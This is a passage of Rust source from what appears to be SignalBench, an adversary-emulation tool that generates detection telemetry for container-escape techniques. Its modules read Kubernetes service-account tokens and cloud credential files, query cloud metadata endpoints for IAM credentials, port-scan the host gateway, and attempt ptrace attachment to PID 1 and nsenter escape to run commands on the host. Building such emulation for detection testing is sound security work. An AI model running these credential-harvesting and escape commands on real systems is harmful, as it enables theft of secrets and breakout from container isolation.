                                findings.push("[INFO] Running in Kubernetes cluster".to_string());
                            } else {
                                findings.push("[EXEC] dig kubernetes.default - No result".to_string());
                            }
                        }
                    }
                    Err(e) => {
                        findings.push(format!("[EXEC] dig - ERROR: {}", e));
                    }
                }
                
                // 7. nslookup kubernetes
                info!("[T1611-RECON] Executing: nslookup kubernetes");
                let nslookup_output = Command::new("nslookup")
                    .args(["kubernetes"])
                    .output()
                    .await;
                
                match nslookup_output {
                    Ok(output) => {
                        if output.status.success() {
                            findings.push("[EXEC] nslookup kubernetes - SUCCESS".to_string());
                            let nslookup_file = format!("{}/nslookup_k8s.txt", output_dir);
                            if let Ok(mut f) = File::create(&nslookup_file) {
                                let _ = f.write_all(output.stdout.as_slice());
                                artefacts.push(nslookup_file);
                            }
                        }
                    }
                    Err(e) => {
                        findings.push(format!("[EXEC] nslookup - ERROR: {}", e));
                    }
                }
            }
            
            // Container environment detection
            let container_env = detect_container_environment_with_prefix("T1611-RECON");
            findings.push(format!("[INFO] Container detected: {}", container_env.is_container));
            if let Some(ref runtime) = container_env.runtime {
                findings.push(format!("[INFO] Runtime: {}", runtime));
            }
            if let Some(ref container_id) = container_env.container_id {
                findings.push(format!("[INFO] Container ID: {}", container_id));
            }
            
            // Kubernetes credential extraction
            let k8s_paths = [
                "/var/run/secrets/kubernetes.io/serviceaccount/token",
                "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
                "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
            ];
            
            let mut k8s_found = false;
            for path in &k8s_paths {
                info!("[T1611-RECON] Executing: cat {}", path);
                let cat_output = Command::new("cat")
                    .args([*path])
                    .output()
                    .await;
                
                if let Ok(output) = cat_output {
                    if output.status.success() {
                        k8s_found = true;
                        findings.push(format!("[CRITICAL] cat {} - SUCCESS ({} bytes)", path, output.stdout.len()));
                        
                        let safe_name = path.replace("/", "_");
                        let k8s_file = format!("{}/k8s{}.txt", output_dir, safe_name);
                        if let Ok(mut f) = File::create(&k8s_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(k8s_file);
                        }
                    }
                }
            }
            
            if k8s_found {
                findings.push("[WARNING] Kubernetes service account mounted - API access possible".to_string());
                
                // Try kubectl
                info!("[T1611-RECON] Executing: kubectl get pods");
                let kubectl_output = Command::new("kubectl")
                    .args(["get", "pods"])
                    .output()
                    .await;
                
                if let Ok(output) = kubectl_output {
                    if output.status.success() {
                        findings.push("[CRITICAL] kubectl get pods - SUCCESS (can enumerate pods!)".to_string());
                    }
                }
            }
            
            // Credential hunting with find/grep
            if credential_hunt {
                debug!("[T1611-RECON] Starting credential hunt");
                
                // Find .env files
                info!("[T1611-RECON] Executing: find /app /opt -name '*.env' 2>/dev/null");
                let find_env = Command::new("bash")
                    .args(["-c", "find /app /opt /home -name '*.env' -o -name '.env' 2>/dev/null | head -20"])
                    .output()
                    .await;
                
                if let Ok(output) = find_env {
                    let found = String::from_utf8_lossy(&output.stdout);
                    for line in found.lines() {
                        if !line.is_empty() {
                            findings.push(format!("[WARNING] Credential file found: {}", line));
                        }
                    }
                }
                
                // Grep for passwords
                info!("[T1611-RECON] Executing: grep -ri 'password' /app 2>/dev/null");
                let grep_pass = Command::new("bash")
                    .args(["-c", "grep -ri 'password' /app /opt 2>/dev/null | head -10"])
                    .output()
                    .await;
                
                if let Ok(output) = grep_pass {
                    if output.status.success() && !output.stdout.is_empty() {
                        findings.push("[WARNING] Password strings found in application files".to_string());
                    }
                }
                
                // Check cloud credentials
                let cloud_creds = [
                    "/root/.aws/credentials",
                    "/root/.azure/config",
                    "/root/.config/gcloud/credentials.db",
                    "/root/.docker/config.json",
                ];
                
                for cred_file in &cloud_creds {
                    info!("[T1611-RECON] Executing: cat {}", cred_file);
                    let cat_cred = Command::new("cat")
                        .args([*cred_file])
                        .output()
                        .await;
                    
                    if let Ok(output) = cat_cred {
                        if output.status.success() {
                            findings.push(format!("[CRITICAL] cat {} - SUCCESS (cloud creds!)", cred_file));
                        }
                    }
                }
            }
            
            // Get gateway IP
            let gateway_ip = get_gateway_ip_with_prefix("T1611-RECON");
            if let Some(ref gw) = gateway_ip {
                findings.push(format!("[INFO] Gateway/Host IP: {}", gw));
                
                // Gateway port scan with nc
                if scan_gateway {
                    debug!("[T1611-RECON] Scanning gateway for common services");
                    
                    let common_ports = [22, 80, 443, 2375, 2376, 5000, 6443, 8080, 10250];
                    
                    for port in &common_ports {
                        info!("[T1611-RECON] Executing: nc -zv {} {} (timeout 1s)", gw, port);
                        let nc_result = Command::new("timeout")
                            .args(["1", "nc", "-zv", gw, &port.to_string()])
                            .output()
                            .await;
                        
                        if let Ok(output) = nc_result {
                            if output.status.success() {
                                let service = match *port {
                                    22 => "SSH",
                                    80 => "HTTP",
                                    443 => "HTTPS",
                                    2375 => "Docker API (unencrypted)",
                                    2376 => "Docker API (TLS)",
                                    5000 => "Docker Registry",
                                    6443 => "Kubernetes API",
                                    8080 => "HTTP-Alt",
                                    10250 => "Kubelet API",
                                    _ => "Unknown",
                                };
                                findings.push(format!("[INFO] nc {}:{} - OPEN ({})", gw, port, service));
                                
                                if *port == 2375 {
                                    findings.push("[CRITICAL] Docker API exposed without TLS - escape possible".to_string());
                                }
                                if *port == 10250 {
                                    findings.push("[WARNING] Kubelet API accessible - container manipulation possible".to_string());
                                }
                            }
                        }
                    }
                    
                    // Try nmap if available
                    info!("[T1611-RECON] Executing: nmap -sT -p 22,80,443,2375,6443,10250 {}", gw);
                    let nmap_result = Command::new("nmap")
                        .args(["-sT", "-p", "22,80,443,2375,6443,10250", "--open", gw])
                        .output()
                        .await;
                    
                    if let Ok(output) = nmap_result {
                        if output.status.success() {
                            findings.push("[EXEC] nmap gateway scan - SUCCESS".to_string());
                            let nmap_file = format!("{}/nmap_gateway.txt", output_dir);
                            if let Ok(mut f) = File::create(&nmap_file) {
                                let _ = f.write_all(output.stdout.as_slice());
                                artefacts.push(nmap_file);
                            }
                        }
                    }
                }
            }
            
            // Cloud metadata check with curl
            debug!("[T1611-RECON] Checking cloud metadata endpoints");
            let metadata_endpoints = [
                ("169.254.169.254", "AWS/GCP/Azure Metadata", "/latest/meta-data/"),
                ("169.254.169.254", "AWS IMDSv1", "/latest/meta-data/iam/security-credentials/"),
                ("100.100.100.200", "Alibaba Cloud Metadata", "/latest/meta-data/"),
            ];
            
            for (ip, _cloud, path) in &metadata_endpoints {
                let url = format!("http://{}{}", ip, path);
                info!("[T1611-RECON] Executing: curl -s {}", url);
                let curl_result = Command::new("timeout")
                    .args(["2", "curl", "-s", &url])
                    .output()
                    .await;
                
                if let Ok(output) = curl_result {
                    if output.status.success() && !output.stdout.is_empty() {
                        findings.push(format!("[CRITICAL] curl {} - SUCCESS ({} bytes)", url, output.stdout.len()));
                        
                        let safe_name = ip.replace(".", "_");
                        let meta_file = format!("{}/metadata_{}.txt", output_dir, safe_name);
                        if let Ok(mut f) = File::create(&meta_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(meta_file);
                        }
                    }
                }
            }
            
            // =========================================================
            // Deepce-style container enumeration patterns
            // Based on https://github.com/stealthcopter/deepce
            // These are the key detection triggers from Unit42 research
            // =========================================================
            
            info!("[T1611-RECON] Executing: deepce-style container enumeration");
            
            // 1. Check for /.dockerenv (primary Docker indicator)
            info!("[T1611-RECON] Executing: ls -la /.dockerenv");
            let dockerenv = Command::new("ls")
                .args(["-la", "/.dockerenv"])
                .output()
                .await;
            
            match dockerenv {
                Ok(output) => {
                    if output.status.success() {
                        findings.push("[DEEPCE] /.dockerenv exists - RUNNING IN DOCKER".to_string());
                        info!("[T1611-RECON] [DEEPCE] Docker environment file detected");
                    } else {
                        findings.push("[DEEPCE] /.dockerenv not found".to_string());
                    }
                }
                Err(e) => {
                    findings.push(format!("[DEEPCE] /.dockerenv check - ERROR: {}", e));
                }
            }
            
            // 2. Check /proc/1/cgroup for container indicators
            info!("[T1611-RECON] Executing: cat /proc/1/cgroup (container detection)");
            let cgroup_output = Command::new("cat")
                .args(["/proc/1/cgroup"])
                .output()
                .await;
            
            if let Ok(output) = cgroup_output {
                if output.status.success() {
                    let cgroup_content = String::from_utf8_lossy(&output.stdout);
                    
                    // Save for analysis
                    let cgroup_file = format!("{}/proc_1_cgroup.txt", output_dir);
                    if let Ok(mut f) = File::create(&cgroup_file) {
                        let _ = f.write_all(output.stdout.as_slice());
                        artefacts.push(cgroup_file);
                    }
                    
                    // Check for container identifiers
                    if cgroup_content.contains("docker") {
                        findings.push("[DEEPCE] /proc/1/cgroup contains 'docker' - Docker container".to_string());
                    }
                    if cgroup_content.contains("kubepods") || cgroup_content.contains("kubelet") {
                        findings.push("[DEEPCE] /proc/1/cgroup contains 'kubepods' - Kubernetes pod".to_string());
                    }
                    if cgroup_content.contains("lxc") {
                        findings.push("[DEEPCE] /proc/1/cgroup contains 'lxc' - LXC container".to_string());
                    }
                    if cgroup_content.contains("containerd") {
                        findings.push("[DEEPCE] /proc/1/cgroup contains 'containerd' - containerd runtime".to_string());
                    }
                    
                    // Extract container ID from cgroup path
                    for line in cgroup_content.lines() {
                        if line.contains("/docker/") {
                            if let Some(id_start) = line.rfind("/docker/") {
                                let id_part = &line[id_start + 8..];
                                let container_id = id_part.split('/').next().unwrap_or("");
                                if container_id.len() >= 12 {
                                    findings.push(format!("[DEEPCE] Extracted container ID: {}", &container_id[..12]));
                                }
                            }
                        }
                    }
                }
            }
            
            // 3. Check /proc/1/status for PID namespace isolation
            info!("[T1611-RECON] Executing: cat /proc/1/status | grep -E '(Pid|NSpid)'");
            let pid_status = Command::new("bash")
                .args(["-c", "cat /proc/1/status | grep -E '^(Pid|NSpid|NStgid):' 2>/dev/null"])
                .output()
                .await;
            
            if let Ok(output) = pid_status {
                if output.status.success() {
                    let status = String::from_utf8_lossy(&output.stdout);
                    findings.push(format!("[DEEPCE] PID namespace info: {}", status.trim().replace('\n', ", ")));
                    
                    // Check for PID namespace isolation (NSpid will show nested PIDs)
                    if status.contains("NSpid:") {
                        findings.push("[DEEPCE] NSpid present - PID namespace isolation active".to_string());
                    }
                }
            }
            
            // 4. Check /proc/self/mountinfo for overlay/aufs (container filesystem indicators)
            info!("[T1611-RECON] Executing: grep -E 'overlay|aufs' /proc/self/mountinfo");
            let overlay_check = Command::new("bash")
                .args(["-c", "grep -E 'overlay|aufs' /proc/self/mountinfo 2>/dev/null | head -5"])
                .output()
                .await;
            
            if let Ok(output) = overlay_check {
                if output.status.success() && !output.stdout.is_empty() {
                    findings.push("[DEEPCE] Overlay/AUFS filesystem detected - container filesystem".to_string());
                    let overlay_content = String::from_utf8_lossy(&output.stdout);
                    
                    // Look for upperdir path (host filesystem path)
                    for line in overlay_content.lines() {
                        if line.contains("upperdir=") {
                            findings.push("[DEEPCE] Overlay upperdir found - potential host path exposure".to_string());
                            break;
                        }
                    }
                }
            }
            
            // 5. Check for reduced capabilities (container indicator)
            info!("[T1611-RECON] Executing: cat /proc/self/status | grep Cap");
            let caps_check = Command::new("bash")
                .args(["-c", "cat /proc/self/status | grep '^Cap' 2>/dev/null"])
                .output()
                .await;
            
            if let Ok(output) = caps_check {
                if output.status.success() {
                    let caps = String::from_utf8_lossy(&output.stdout);
                    let caps_file = format!("{}/capabilities.txt", output_dir);
                    if let Ok(mut f) = File::create(&caps_file) {
                        let _ = f.write_all(output.stdout.as_slice());
                        artefacts.push(caps_file);
                    }
                    
                    // Check for dangerous capabilities
                    for line in caps.lines() {
                        if line.starts_with("CapEff:") {
                            let cap_hex = line.replace("CapEff:", "").trim().to_string();
                            // Full capabilities = 0000003fffffffff, reduced = lower value
                            if cap_hex.starts_with("0000003f") {
                                findings.push("[DEEPCE] [CRITICAL] Full capabilities detected - privileged container".to_string());
                            } else if cap_hex.starts_with("00000000") {
                                findings.push("[DEEPCE] Reduced capabilities - standard container".to_string());
                            }
                        }
                    }
                }
            }
            
            // 6. Check for common container escape vectors
            info!("[T1611-RECON] Executing: deepce escape vector enumeration");
            
            // Check Docker socket
            let socket_paths = ["/var/run/docker.sock", "/run/docker.sock", "/var/run/containerd/containerd.sock"];
            for socket in &socket_paths {
                let socket_check = Command::new("ls")
                    .args(["-la", *socket])
                    .output()
                    .await;
                
                if let Ok(output) = socket_check {
                    if output.status.success() {
                        findings.push(format!("[DEEPCE] [CRITICAL] Container socket found: {} - ESCAPE POSSIBLE", socket));
                    }
                }
            }
            
            // Check for privileged mount points
            let priv_mounts = ["/dev/sda", "/dev/sda1", "/dev/xvda", "/dev/nvme0n1"];
            for mount in &priv_mounts {
                if Path::new(mount).exists() {
                    findings.push(format!("[DEEPCE] [WARNING] Block device accessible: {} - privileged mode likely", mount));
                }
            }
            
            // 7. Check for process namespace info
            info!("[T1611-RECON] Executing: ls -la /proc/1/ns/");
            let ns_check = Command::new("ls")
                .args(["-la", "/proc/1/ns/"])
                .output()
                .await;
            
            if let Ok(output) = ns_check {
                if output.status.success() {
                    let ns_info = String::from_utf8_lossy(&output.stdout);
                    let ns_file = format!("{}/namespaces.txt", output_dir);
                    if let Ok(mut f) = File::create(&ns_file) {
                        let _ = f.write_all(output.stdout.as_slice());
                        artefacts.push(ns_file);
                    }
                    
                    // Count namespaces
                    let ns_count = ns_info.lines().count().saturating_sub(1); // Exclude header
                    findings.push(format!("[DEEPCE] Process namespaces: {} types found", ns_count));
                }
            }
            
            // 8. Check for seccomp filter
            info!("[T1611-RECON] Executing: grep Seccomp /proc/self/status");
            let seccomp_check = Command::new("bash")
                .args(["-c", "grep '^Seccomp:' /proc/self/status 2>/dev/null"])
                .output()
                .await;
            
            if let Ok(output) = seccomp_check {
                if output.status.success() {
                    let seccomp = String::from_utf8_lossy(&output.stdout).trim().to_string();
                    if seccomp.contains("0") {
                        findings.push("[DEEPCE] Seccomp: DISABLED - syscall filter not active".to_string());
                    } else if seccomp.contains("1") {
                        findings.push("[DEEPCE] Seccomp: STRICT mode".to_string());
                    } else if seccomp.contains("2") {
                        findings.push("[DEEPCE] Seccomp: FILTER mode (standard container profile)".to_string());
                    }
                }
            }
            
            // 9. Check for AppArmor profile
            info!("[T1611-RECON] Executing: cat /proc/self/attr/current");
            let apparmor_check = Command::new("cat")
                .args(["/proc/self/attr/current"])
                .output()
                .await;
            
            if let Ok(output) = apparmor_check {
                if output.status.success() {
                    let profile = String::from_utf8_lossy(&output.stdout).trim().to_string();
                    if profile == "unconfined" {
                        findings.push("[DEEPCE] [WARNING] AppArmor: unconfined - no MAC protection".to_string());
                    } else if profile.contains("docker-default") {
                        findings.push("[DEEPCE] AppArmor: docker-default profile active".to_string());
                    } else if !profile.is_empty() {
                        findings.push(format!("[DEEPCE] AppArmor profile: {}", profile));
                    }
                }
            }
            
            // 10. Check for common container tooling in path
            info!("[T1611-RECON] Executing: which docker crictl kubectl ctr");
            let tools_check = Command::new("bash")
                .args(["-c", "which docker crictl kubectl ctr 2>/dev/null || true"])
                .output()
                .await;
            
            if let Ok(output) = tools_check {
                if output.status.success() && !output.stdout.is_empty() {
                    let tools = String::from_utf8_lossy(&output.stdout);
                    for tool in tools.lines() {
                        if !tool.is_empty() {
                            findings.push(format!("[DEEPCE] Container tool in path: {}", tool));
                        }
                    }
                }
            }
            
            // Write environment dump
            let env_file = format!("{}/environment.txt", output_dir);
            if let Ok(mut f) = File::create(&env_file) {
                let mut env_dump = String::from("Environment Variables\n");
                env_dump.push_str(&"=".repeat(30));
                env_dump.push('\n');
                for (key, value) in std::env::vars() {
                    // Redact sensitive values
                    let redacted = if key.to_uppercase().contains("PASSWORD") || 
                                     key.to_uppercase().contains("SECRET") ||
                                     key.to_uppercase().contains("TOKEN") ||
                                     key.to_uppercase().contains("KEY") {
                        "[REDACTED]".to_string()
                    } else {
                        value
                    };
                    env_dump.push_str(&format!("{}={}\n", key, redacted));
                }
                let _ = f.write_all(env_dump.as_bytes());
                artefacts.push(env_file);
            }
            
            // Write findings report
            let report_file = format!("{}/recon_report.txt", output_dir);
            if let Ok(mut f) = File::create(&report_file) {
                let report = format!(
                    "SignalBench T1611-RECON - Container Reconnaissance Report\n{}\n\nFindings ({} total):\n{}\n",
                    "=".repeat(55),
                    findings.len(),
                    findings.join("\n")
                );
                let _ = f.write_all(report.as_bytes());
                artefacts.push(report_file);
            }
            
            let critical_count = findings.iter().filter(|f| f.contains("[CRITICAL]")).count();
            let message = format!(
                "Container reconnaissance complete: {} findings ({} critical)",
                findings.len(),
                critical_count
            );
            
            info!("[T1611-RECON] Technique complete: {}", message);
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message,
                artifacts: artefacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artefacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            debug!("[T1611-RECON] Starting cleanup of {} artefacts", artefacts.len());
            
            for artefact in artefacts {
                let path = Path::new(artefact);
                if path.is_dir() {
                    debug!("[T1611-RECON] Removing directory: {}", artefact);
                    if let Err(e) = fs::remove_dir_all(path) {
                        warn!("[T1611-RECON] Failed to remove directory {}: {}", artefact, e);
                    }
                } else if path.is_file() {
                    debug!("[T1611-RECON] Removing file: {}", artefact);
                    if let Err(e) = fs::remove_file(path) {
                        warn!("[T1611-RECON] Failed to remove file {}: {}", artefact, e);
                    }
                }
            }
            
            info!("[T1611-RECON] Cleanup complete");
            Ok(())
        })
    }
}

// =============================================================================
// T1611-PIDNS: Host PID Namespace Escape
// =============================================================================

pub struct HostPidNamespaceEscape {}

#[async_trait]
impl AttackTechnique for HostPidNamespaceEscape {
    fn info(&self) -> Technique {
        Technique {
            id: "T1611-PIDNS".to_string(),
            name: "Host PID Namespace Escape".to_string(),
            description: "Host PID namespace escape via --pid=host detection. Runs ps aux, cat /proc/1/cmdline, ls -la /proc/1, strace -p 1, nsenter --target 1, readlink /proc/1/ns/pid, and gdb attachment attempts. Detects shared PID namespace and generates telemetry for process injection detection. Based on Unit42 CAP_SYS_PTRACE research.".to_string(),
            category: "privilege_escalation".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "output_dir".to_string(),
                    description: "Directory for PID namespace escape simulation output".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_pidns_escape".to_string()),
                },
                TechniqueParameter {
                    name: "enumerate_processes".to_string(),
                    description: "Enumerate visible processes with ps aux".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
                TechniqueParameter {
                    name: "test_ptrace".to_string(),
                    description: "Attempt strace/gdb on PID 1 for telemetry".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
            ],
            detection: "Monitor for: ps aux, cat /proc/1/cmdline, strace -p, gdb attach, nsenter --target 1, readlink /proc/*/ns/pid, CAP_SYS_PTRACE capability checks from containers.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let output_dir = config
                .parameters
                .get("output_dir")
                .cloned()
                .unwrap_or_else(|| "/tmp/signalbench_pidns_escape".to_string());
            
            let enumerate_processes = config
                .parameters
                .get("enumerate_processes")
                .map(|v| v.to_lowercase() == "true")
                .unwrap_or(true);
            
            debug!("[T1611-PIDNS] Starting Host PID Namespace Escape technique");
            debug!("[T1611-PIDNS] Output directory: {}", output_dir);
            debug!("[T1611-PIDNS] Enumerate processes: {}", enumerate_processes);
            
            let mut artefacts = Vec::new();
            let mut findings = Vec::new();
            
            // Check capabilities
            let caps = parse_capabilities_with_prefix("T1611-PIDNS");
            let has_sys_ptrace = has_capability(&caps, CAP_SYS_PTRACE);
            let has_sys_admin = has_capability(&caps, CAP_SYS_ADMIN);
            
            debug!("[T1611-PIDNS] CAP_SYS_PTRACE present: {}", has_sys_ptrace);
            
            let test_ptrace = config
                .parameters
                .get("test_ptrace")
                .map(|v| v.to_lowercase() == "true")
                .unwrap_or(true);
            
            if dry_run {
                info!("[DRY RUN] Would perform Host PID Namespace Escape:");
                info!("[DRY RUN] - Execute: ps aux");
                info!("[DRY RUN] - Execute: cat /proc/1/cmdline");
                info!("[DRY RUN] - Execute: ls -la /proc/1");
                info!("[DRY RUN] - Execute: readlink /proc/1/ns/pid");
                if enumerate_processes {
                    info!("[DRY RUN] - Execute: pstree");
                    info!("[DRY RUN] - Execute: cat /proc/1/status");
                }
                if test_ptrace {
                    info!("[DRY RUN] - Execute: strace -p 1 (quick attach attempt)");
                    info!("[DRY RUN] - Execute: gdb -p 1 -batch");
                    info!("[DRY RUN] - Execute: nsenter --target 1 --all -- id");
                }
                info!("[DRY RUN] - Write findings to: {}", output_dir);
                
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would perform host PID namespace escape".to_string(),
                    artifacts: vec![output_dir],
                    cleanup_required: false,
                });
            }
            
            // Create output directory
            debug!("[T1611-PIDNS] Creating output directory");
            if let Err(e) = fs::create_dir_all(&output_dir) {
                warn!("[T1611-PIDNS] Failed to create output directory: {}", e);
            } else {
                artefacts.push(output_dir.clone());
            }
            
            // Check CAP_SYS_PTRACE
            if has_sys_ptrace {
                findings.push("[CRITICAL] CAP_SYS_PTRACE present - process injection possible".to_string());
                info!("[T1611-PIDNS] [CRITICAL] CAP_SYS_PTRACE capability detected");
            } else {
                findings.push("[SAFE] CAP_SYS_PTRACE not present - ptrace blocked".to_string());
            }
            
            if has_sys_admin {
                findings.push("[WARNING] CAP_SYS_ADMIN also present - enhanced escape potential".to_string());
            }
            
            // =========================================================
            // Execute commands for telemetry
            // =========================================================
            
            // 1. ps aux - Full process listing
            info!("[T1611-PIDNS] Executing: ps aux");
            let ps_output = Command::new("ps")
                .args(["aux"])
                .output()
                .await;
            
            match ps_output {
                Ok(output) => {
                    if output.status.success() {
                        let process_count = String::from_utf8_lossy(&output.stdout).lines().count() - 1;
                        findings.push(format!("[EXEC] ps aux - SUCCESS ({} processes)", process_count));
                        let ps_file = format!("{}/ps_aux.txt", output_dir);
                        if let Ok(mut f) = File::create(&ps_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(ps_file);
                        }
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] ps aux - ERROR: {}", e));
                }
            }
            
            // 2. cat /proc/1/cmdline - PID 1 command line
            info!("[T1611-PIDNS] Executing: cat /proc/1/cmdline");
            let cmdline_output = Command::new("cat")
                .args(["/proc/1/cmdline"])
                .output()
                .await;
            
            match cmdline_output {
                Ok(output) => {
                    if output.status.success() {
                        let cmdline = String::from_utf8_lossy(&output.stdout).replace('\0', " ");
                        findings.push(format!("[EXEC] cat /proc/1/cmdline - '{}'", cmdline.trim()));
                        
                        if cmdline.contains("systemd") || cmdline.contains("/sbin/init") {
                            findings.push("[CRITICAL] PID 1 is host init - shared PID namespace!".to_string());
                        }
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] cat /proc/1/cmdline - ERROR: {}", e));
                }
            }
            
            // 3. ls -la /proc/1 - PID 1 directory
            info!("[T1611-PIDNS] Executing: ls -la /proc/1");
            let ls_proc1 = Command::new("ls")
                .args(["-la", "/proc/1"])
                .output()
                .await;
            
            match ls_proc1 {
                Ok(output) => {
                    if output.status.success() {
                        findings.push("[EXEC] ls -la /proc/1 - SUCCESS".to_string());
                        let ls_file = format!("{}/proc_1_listing.txt", output_dir);
                        if let Ok(mut f) = File::create(&ls_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(ls_file);
                        }
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] ls -la /proc/1 - ERROR: {}", e));
                }
            }
            
            // 4. readlink /proc/1/ns/pid - Check PID namespace
            info!("[T1611-PIDNS] Executing: readlink /proc/1/ns/pid");
            let ns_pid1 = Command::new("readlink")
                .args(["/proc/1/ns/pid"])
                .output()
                .await;
            
            let mut pid1_ns = String::new();
            if let Ok(output) = ns_pid1 {
                if output.status.success() {
                    pid1_ns = String::from_utf8_lossy(&output.stdout).trim().to_string();
                    findings.push(format!("[EXEC] readlink /proc/1/ns/pid - {}", pid1_ns));
                }
            }
            
            // 5. readlink /proc/self/ns/pid - Check our PID namespace
            info!("[T1611-PIDNS] Executing: readlink /proc/self/ns/pid");
            let ns_self = Command::new("readlink")
                .args(["/proc/self/ns/pid"])
                .output()
                .await;
            
            if let Ok(output) = ns_self {
                if output.status.success() {
                    let self_ns = String::from_utf8_lossy(&output.stdout).trim().to_string();
                    findings.push(format!("[EXEC] readlink /proc/self/ns/pid - {}", self_ns));
                    
                    if !pid1_ns.is_empty() && pid1_ns == self_ns {
                        findings.push("[CRITICAL] Same PID namespace as PID 1 - host namespace shared!".to_string());
                    }
                }
            }
            
            // Process enumeration with pstree
            if enumerate_processes {
                // 6. pstree - Process tree
                info!("[T1611-PIDNS] Executing: pstree -p");
                let pstree_output = Command::new("pstree")
                    .args(["-p"])
                    .output()
                    .await;
                
                match pstree_output {
                    Ok(output) => {
                        if output.status.success() {
                            findings.push("[EXEC] pstree -p - SUCCESS".to_string());
                            let pstree_file = format!("{}/pstree.txt", output_dir);
                            if let Ok(mut f) = File::create(&pstree_file) {
                                let _ = f.write_all(output.stdout.as_slice());
                                artefacts.push(pstree_file);
                            }
                        }
                    }
                    Err(e) => {
                        findings.push(format!("[EXEC] pstree - ERROR: {}", e));
                    }
                }
                
                // 7. cat /proc/1/status - PID 1 status
                info!("[T1611-PIDNS] Executing: cat /proc/1/status");
                let status_output = Command::new("cat")
                    .args(["/proc/1/status"])
                    .output()
                    .await;
                
                if let Ok(output) = status_output {
                    if output.status.success() {
                        findings.push("[EXEC] cat /proc/1/status - SUCCESS".to_string());
                        let status_file = format!("{}/pid1_status.txt", output_dir);
                        if let Ok(mut f) = File::create(&status_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(status_file);
                        }
                    }
                }
            }
            
            // Attempt ptrace operations (will trigger detection)
            if test_ptrace {
                // 8. strace -p 1 (quick attach) - This will fail but triggers syscall
                info!("[T1611-PIDNS] Executing: timeout 1 strace -p 1");
                let strace_output = Command::new("timeout")
                    .args(["1", "strace", "-p", "1"])
                    .output()
                    .await;
                
                match strace_output {
                    Ok(output) => {
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        if output.status.success() || stderr.contains("attached") {
                            findings.push("[CRITICAL] strace -p 1 - ATTACHED (can trace init!)".to_string());
                        } else if stderr.contains("Permission denied") || stderr.contains("Operation not permitted") {
                            findings.push("[EXEC] strace -p 1 - BLOCKED (ptrace denied)".to_string());
                        } else {
                            findings.push(format!("[EXEC] strace -p 1 - {}", stderr.trim()));
                        }
                    }
                    Err(e) => {
                        findings.push(format!("[EXEC] strace - ERROR: {}", e));
                    }
                }
                
                // 9. gdb -p 1 -batch - GDB attach attempt
                info!("[T1611-PIDNS] Executing: timeout 2 gdb -p 1 -batch -ex quit");
                let gdb_output = Command::new("timeout")
                    .args(["2", "gdb", "-p", "1", "-batch", "-ex", "quit"])
                    .output()
                    .await;
                
                match gdb_output {
                    Ok(output) => {
                        let stdout = String::from_utf8_lossy(&output.stdout);
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        if stdout.contains("Attaching") || output.status.success() {
                            findings.push("[CRITICAL] gdb -p 1 - ATTACHED (can debug init!)".to_string());
                        } else if stderr.contains("Permission denied") || stderr.contains("ptrace") {
                            findings.push("[EXEC] gdb -p 1 - BLOCKED (ptrace denied)".to_string());
                        } else {
                            findings.push(format!("[EXEC] gdb -p 1 - {}", stderr.trim()));
                        }
                    }
                    Err(e) => {
                        findings.push(format!("[EXEC] gdb - ERROR: {}", e));
                    }
                }
                
                // 10. nsenter --target 1 --all -- id
                info!("[T1611-PIDNS] Executing: nsenter --target 1 --all -- id");
                let nsenter_output = Command::new("nsenter")
                    .args(["--target", "1", "--all", "--", "id"])
                    .output()
                    .await;
                
                let mut nsenter_succeeded = false;
                match nsenter_output {
                    Ok(output) => {
                        let stdout = String::from_utf8_lossy(&output.stdout);
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        if output.status.success() {
                            findings.push(format!("[CRITICAL] nsenter --target 1 --all - SUCCESS: {}", stdout.trim()));
                            findings.push("[ESCAPE] Full namespace escape to host achieved!".to_string());
                            nsenter_succeeded = true;
                        } else {
                            findings.push(format!("[EXEC] nsenter --target 1 --all - BLOCKED: {}", stderr.trim()));
                        }
                    }
                    Err(e) => {
                        findings.push(format!("[EXEC] nsenter - ERROR: {}", e));
                    }
                }
                
                // 10b. If nsenter succeeded, create a marker file on the host to prove escape
                let host_marker_path: &str = "/tmp/signalbench_pidns_escape_marker";
                if nsenter_succeeded {
                    info!("[T1611-PIDNS] Creating host marker file via nsenter");
                    let marker_cmd = format!(
                        "touch {} && echo 'SignalBench T1611-PIDNS escape marker - created at '$(date) > {}",
                        host_marker_path, host_marker_path
                    );
                    let marker_output = Command::new("nsenter")
                        .args(["--target", "1", "--all", "--", "sh", "-c", &marker_cmd])
                        .output()
                        .await;
                    
                    match marker_output {
                        Ok(output) => {
                            if output.status.success() {
                                findings.push(format!("[ESCAPE] Host marker file created: {}", host_marker_path));
                                findings.push("[ESCAPE] Container escape to host filesystem CONFIRMED!".to_string());
                                artefacts.push(host_marker_path.to_string());
                                info!("[T1611-PIDNS] [CRITICAL] Marker file created on host via nsenter");
                            } else {
                                let stderr = String::from_utf8_lossy(&output.stderr);
                                findings.push(format!("[EXEC] marker creation - BLOCKED: {}", stderr.trim()));
                            }
                        }
                        Err(e) => {
                            findings.push(format!("[EXEC] marker creation - ERROR: {}", e));
                        }
                    }
                    
                    // Verify marker file exists
                    let verify_output = Command::new("nsenter")
                        .args(["--target", "1", "--all", "--", "cat", host_marker_path])
